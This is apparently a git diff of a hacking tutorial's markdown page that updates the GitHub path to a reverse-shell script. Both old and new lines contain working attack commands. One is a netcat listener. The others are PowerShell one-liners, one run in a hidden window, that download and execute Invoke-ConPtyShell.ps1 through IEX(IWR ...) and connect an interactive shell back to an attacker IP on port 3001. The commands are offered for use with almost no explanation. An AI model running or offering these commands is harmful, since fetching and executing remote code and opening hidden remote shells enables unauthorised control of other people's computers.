@@ -14,13 +14,13 @@ stty raw -echo; (stty size; cat) | nc -lvnp 3001
 Client Side:
 
 ```hidden
-start-process PowerShell.exe -windowstyle hidden "IEX(IWR https://raw.githubusercontent.com/khashino/tutorials/master/Hacks/ReverceShell/PowerShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.137.6 3001"
+start-process PowerShell.exe -windowstyle hidden "IEX(IWR https://raw.githubusercontent.com/khashino/tutorials/master/Tricks/Hacking/ReverceShell/PowerShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.137.6 3001"
 ```
 ```
-IEX(IWR https://raw.githubusercontent.com/khashino/tutorials/master/Hacks/ReverceShell/PowerShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+IEX(IWR https://raw.githubusercontent.com/khashino/tutorials/master/Tricks/Hacking/ReverceShell/PowerShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
 ```
 ```
-IEX(IWR https://raw.githubusercontent.com/khashino/tutorials/master/Hacks/ReverceShell/PowerShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+IEX(IWR https://raw.githubusercontent.com/khashino/tutorials/master/Tricks/Hacking/ReverceShell/PowerShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
 ```
 
 Offline version of the ps1 available at --> https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
